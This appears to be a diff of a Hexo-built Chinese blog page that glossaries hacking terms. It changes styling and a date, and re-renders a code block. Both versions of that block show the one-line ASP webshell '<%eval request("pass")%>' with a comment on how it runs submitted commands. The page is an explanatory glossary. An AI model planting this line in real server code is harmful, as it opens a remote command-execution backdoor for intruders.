@@ -29,8 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-material-light.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+<meta name="generator" content="Hexo 4.2.0"></head>
 
 
 <body>
@@ -554,7 +553,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-09-24
+                    2020-12-24
                 </div>
                 
 
@@ -616,10 +615,10 @@
 <h3 id="Wdbshell"><a href="#Wdbshell" class="headerlink" title="Wdbshell"></a>Wdbshell</h3><p>通过Web入侵的一种脚本工具，可以据此对网站服务进行一定程度的控制。</p>
 <h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>硬件、软件、协议等等的可利用安全缺陷，可能被攻击者利用，对数据进行篡改，控制等。</p>
 <h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>通过向服务端提交一句简单的代码，配合本地客户端实现webshell功能的木马。</p>
-<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%eval</span> <span class="token attr-name">request("pass")%</span><span class="token punctuation">></span></span></span>
-  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%execute(request("pass"))%</span><span class="token punctuation">></span></span></span>
-  <span class="token function">request</span><span class="token punctuation">(</span><span class="token string">"pass"</span><span class="token punctuation">)</span>
- <span class="token shell-comment comment"># 接收客户端提交的数据，pass为执行命令的参数值。 eval/execute 函数执行客户端命令的内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="php">&lt;%eval request(&quot;pass&quot;)%&gt;
+  &lt;%execute(request(&quot;pass&quot;))%&gt;
+  request(&quot;pass&quot;)
+ # 接收客户端提交的数据，pass为执行命令的参数值。 eval/execute 函数执行客户端命令的内容</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/rainbowtp/blog_photo//data/php.png" alt=""></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>操作做系统低权限的账户将自己提升为管理员权限所使用的的方法。</p>
 <h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”</p>
